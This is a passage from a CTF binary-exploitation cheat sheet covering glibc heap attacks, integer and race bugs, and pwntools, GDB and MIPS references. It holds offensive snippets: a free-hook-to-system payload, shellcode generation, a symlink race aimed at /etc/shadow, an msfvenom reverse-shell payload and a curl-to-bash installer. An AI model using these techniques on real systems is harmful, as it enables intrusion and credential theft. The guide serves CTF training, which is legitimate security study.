**Exploit:** overwrite the chunk's `bk` (back) pointer with `target_addr - 0x10`; when `malloc` next processes the unsorted bin, it writes the unsorted bin's head address into `target_addr`, giving you a **large, mostly-uncontrolled write of a libc address** — commonly used to leak a libc pointer into a location you can read back (e.g., overwrite a global variable with a libc pointer for an easy leak), less often as a precise write primitive on its own.

### House of Orange / House of Spirit / House of Lore
Named exploitation techniques for specific glibc versions/scenarios — worth knowing the *names* for CTF writeup/challenge-naming pattern recognition, but look up the specific glibc-version writeup when you hit one; the exact chunk layout requirements shift between releases and hand-memorizing all variants isn't productive. `how2heap` (see below) has a working PoC for each.

### `__malloc_hook` / `__free_hook` (glibc < 2.34 only)
Global function pointers called at the start of `malloc()`/`free()` if non-NULL — a direct "call this address with these args" primitive once you can write to them via tcache poisoning or similar. Removed in 2.34+; check your libc version before planning around this.
```python
# once you have an arbitrary write primitive:
payload = {libc.symbols['__free_hook']: libc.symbols['system']}
# then free() a chunk containing "/bin/sh" — free(chunk) becomes system(chunk_contents)
```

### 2.34+ — targeting `_IO_FILE` / exit handlers instead
With hooks gone, common modern targets are:
- **`_IO_FILE` vtable hijack** (FSOP — File Stream Oriented Programming): corrupt a `FILE*` structure's vtable pointer to redirect calls like `fclose`/`fwrite` through attacker-controlled function pointers. Tools: `pwndbg`'s `fsop` command, House of Apple / House of Cat techniques.
- **`__exit_funcs`** array corruption to hijack code run at `exit()`.
- Standard GOT overwrite once you have any arbitrary write, regardless of glibc version — often the simplest route if RELRO is Partial/None.

### Essential heap CTF tools
```bash
# how2heap — reference PoCs for every major heap technique, per glibc version
git clone https://github.com/shellphish/how2heap

# pwndbg heap commands (run inside gdb with pwndbg loaded)
heap                  # list all chunks
bins                  # show all freelist bins (tcache/fastbin/unsorted/small/large) with contents
chunk <addr>          # inspect a specific chunk's header
tcache                # tcache-specific view
vis_heap_chunks       # visual heap layout
fsop                  # (2.34+) helps identify FSOP-exploitable FILE structures
```

---

## Integer Bugs → Memory Corruption

**Pattern:** a size or index value is checked with a signed comparison but used as unsigned (or vice versa), or an addition/multiplication used to compute a buffer size overflows before the allocation happens.

```c
// Example: signed/unsigned mismatch
int len = get_user_length();   // attacker can send a negative number
if (len < 100) {                // passes: -1 < 100 is true
    read(0, buf, len);          // read() takes size_t -> -1 becomes SIZE_MAX -> massive overflow
}
```
```c
// Example: multiplication overflow before malloc
unsigned int count = get_user_count();      // e.g. 0x40000000
char *buf = malloc(count * sizeof(item));   // wraps to a small number on 32-bit multiply
// buf is now much smaller than the count of items the rest of the code expects to fit
```
**Exploit approach:** find the exact boundary value that flips the comparison or wraps the multiplication (`INT_MAX`, `UINT_MAX`, `SIZE_MAX`, or power-of-two boundaries depending on the types involved), then use the resulting undersized allocation / oversized read as a standard stack or heap overflow primitive from there.

---

## Race Conditions / TOCTOU

**Pattern:** "Time Of Check To Time Of Use" — a program checks a condition (file permissions, a flag value, whether a resource is still valid) and then acts on it, but another thread/process can change that condition in the gap between the check and the use.

**Common CTF shape:** a setuid binary checks file permissions via `access()`, then later `open()`s the same path by name — swap a symlink at that path between the two calls to point somewhere else (classic symlink race).

```bash
# General approach: fire the racing operation in a tight loop from a second process/thread
# while a symlink-swap script alternates the target file in a tight loop too
while true; do ln -sf /tmp/legit_file /tmp/race_target; ln -sf /etc/shadow /tmp/race_target; done &
./vulnerable_binary /tmp/race_target
```
For multi-threaded in-process races (e.g., two threads both freeing/using the same heap chunk without locking), pwntools' `context.threads` / plain Python `threading` to fire near-simultaneous requests at a network service is the usual approach — win rate is probabilistic, so scripted retry loops (hundreds/thousands of attempts) are normal.

---

## Pwntools Reference

### Connection
```python
p = process('./<BINARY>')
p = remote('<IP>', <PORT>)
p = process(['qemu-mips', '-L', '/usr/mips-linux-gnu', './<BINARY>'])
```

### I/O
```python
p.recv()
p.recv(n)
p.recvline()
p.recvuntil(b'> ')
p.recvall(timeout=5)

p.send(b'data')
p.sendline(b'data')
p.sendafter(b'> ', payload)
p.sendlineafter(b'> ', payload)

p.interactive()
```

### Packing
```python
p64(0x401234)
p32(0x401234)
u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')
u32(b'\x34\x12\x40\x00')
p32(0x401234, endian='big')  # MIPS etc.
```

### ELF Analysis
```python
elf = ELF('<BINARY>')
elf.symbols['main']
elf.plt['system']
elf.got['puts']
elf.functions['main'].size
next(elf.search(b'/bin/sh'))
```

### Pattern Generation
```python
cyclic(200)
cyclic_find(0x61616168)
```

### ROP
```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
print(rop.dump())
rop.chain()
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['ret'])
```

### Format String
```python
fmtstr_payload(offset, {target_addr: value})
```

### SROP
```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
```

### Shellcode
```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.cat('/flag.txt'))
```

### Logging
```python
context.log_level = 'debug'
context.log_level = 'info'
context.log_level = 'warn'
```

---

## GDB Cheatsheet

### Setup
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
# or GEF:
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

### Running
```bash
gdb ./<BINARY>
run
run < <(python3 -c "...")
gdb -p <PID>
# QEMU (MIPS/ARM):
# term1: qemu-mips -L /usr/mips-linux-gnu -g 1234 ./<BINARY>
# term2: gdb-multiarch <BINARY> -ex "target remote :1234"
```

### Breakpoints
```bash
b main
b *0x401234
b *main+50
info breakpoints
delete 1
```

### Examination
```bash
info registers
info registers rip rsp rbp

x/20wx $rsp
x/10gx $rsp
x/s 0x402000
x/i 0x401234
x/50i main

stack 20               # pwndbg
telescope $rsp 20      # pwndbg
heap                   # pwndbg — heap chunk listing
bins                   # pwndbg — freelist bins
```

### Stepping
```bash
ni      # next instruction (skip calls)
si      # step into (follow calls)
c       # continue
finish  # run until current function returns
```

### Finding the Crash
```bash
info registers rip
bt
python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
```

---

## MIPS-Specific Notes

### Architecture Differences
```
- Big-endian (usually) — use p32(addr, endian='big')
- 32-bit addresses
- Return address in $ra register (not on stack like x86)
- $ra saved with: sw $ra, offset($sp)
- Branch delay slots — instruction AFTER branch always executes
- Function args: $a0, $a1, $a2, $a3 (then stack)
- No NX equivalent in most MIPS CTF setups
```

### MIPS Offset Calculation
```
Frame size:    addiu $sp, $sp, -0xXX
$ra saved at:  sw $ra, 0xYY($sp)
Buffer at:     sw $a0, 0xZZ($fp)   (or addiu + offset)

Offset = $ra_position - buffer_position
```

### Running MIPS Binaries
```bash
apt install qemu-user gcc-mips-linux-gnu
qemu-mips -L /usr/mips-linux-gnu ./<BINARY>
qemu-mips -L /usr/mips-linux-gnu -g 1234 ./<BINARY>
gdb-multiarch <BINARY> -ex "target remote :1234"
```

### MIPS Pwntools
```python
context.arch = 'mips'
context.endian = 'big'
context.bits = 32

p = process(['qemu-mips', '-L', '/usr/mips-linux-gnu', './<BINARY>'])
payload = b'A' * OFFSET + p32(WIN_ADDR)
```

---

## Windows Pwn — Quick Notes

Rare in HTB but occasionally shows up. Different toolchain and terminology from Linux pwn:

```
Mitigations to check (instead of checksec):    DEP (≈NX), ASLR, SafeSEH/SEHOP, CFG, GS (≈canary)
Common tool:                                    WinDbg / x64dbg / Immunity Debugger + mona.py
Classic technique:                              SEH overwrite (overwrite exception handler chain instead of return address, then trigger an exception to hijack execution)
Gadget/module base info without ASLR leak:       Look for a non-ASLR-compiled DLL loaded by the process (mona.py `!mona modules` flags these) to source gadgets from a fixed address
Shellcode:                                       msfvenom -p windows/x64/shell_reverse_tcp ... (or exec)
```
Given the far smaller footprint of Windows pwn in most CTF tracks (HTB included), treat this as a "know it exists, look up the specific technique when you hit it" category rather than something to memorize deeply up front — the underlying concepts (overflow → hijack control flow → bypass mitigations → get code exec) transfer directly from everything above.

---

## Challenge Triage Flowchart

```
1. file + checksec
   │
   ├─ Menu-driven, malloc/free heavy → HEAP CHALLENGE (Section 22)
   │   ├─ Check glibc version FIRST — technique availability depends entirely on it
   │   ├─ UAF present (freed ptr reused)? → leak via stale read, or tcache poison via reuse
   │   ├─ Double-free possible? → tcache/fastbin poisoning → arbitrary malloc → GOT/hook overwrite
   │   ├─ Overflow into adjacent chunk? → corrupt size/fd of neighbor → same endgame
   │   └─ glibc 2.34+? → hooks gone, target GOT / _IO_FILE vtable / __exit_funcs instead
   │
   ├─ seccomp filter present → Section 18 (orw chain instead of system/execve)
   │
   ├─ printf(user_input) anywhere → format string bug in play regardless of other findings
   │   (use for canary leak / libc leak / arbitrary write even if a stack overflow also exists)
   │
   ├─ No PIE + No Canary
   │   ├─ Win function exists → ret2win
   │   ├─ system() in PLT + /bin/sh string → ret2system
   │   ├─ No useful functions, libc leak possible → ret2libc
   │   ├─ No libc leak possible at all → ret2dlresolve
   │   ├─ Sparse gadgets, one syscall;ret available → SROP
   │   └─ NX disabled → shellcode injection
   │
   ├─ PIE enabled + No Canary
   │   └─ Leak (format string / GOT-leak-then-overflow) → recalculate base → then any of the above
   │
   ├─ No PIE + Canary
   │   ├─ Format string vuln → leak canary, then overflow normally
   │   ├─ Multiple reads (leak stage + overflow stage) → leak canary in stage 1
   │   └─ Forking service, no leak available → byte-by-byte brute force
   │
   ├─ PIE + Canary
   │   └─ Need two leaks (canary + base) → then overflow
   │
   ├─ Overflow room too small for a full ROP chain → Stack Pivot into a larger controlled buffer
   │
   └─ Signed/unsigned size or index bug → Integer Bug (Section 23) → usually resolves into one of the above once you find the boundary value

2. Confirm vulnerability class precisely (Phase 4) before writing any exploit code.

3. Build and test locally (patched libc, Section Phase 0) before firing at the remote target.
```

---

## Tool Installation
```bash
# Pwntools
pip install pwntools

# ROPgadget / ropper
pip install ROPgadget
pip install ropper

# one_gadget
gem install one_gadget

# seccomp-tools
gem install seccomp-tools

# Ghidra
apt install ghidra

# pwndbg (GDB plugin — essential for heap work)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# QEMU for cross-arch
apt install qemu-user qemu-user-static

# Cross-compilation toolchains
apt install gcc-mips-linux-gnu gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf

# patchelf (for matching remote libc locally)
apt install patchelf

# pwninit (automates libc/interpreter patching + solve.py skeleton)
pip install pwninit

# libc-database (local offline libc identification)
git clone https://github.com/niklasb/libc-database

# how2heap (reference PoCs for every heap technique, per glibc version)
git clone https://github.com/shellphish/how2heap
```
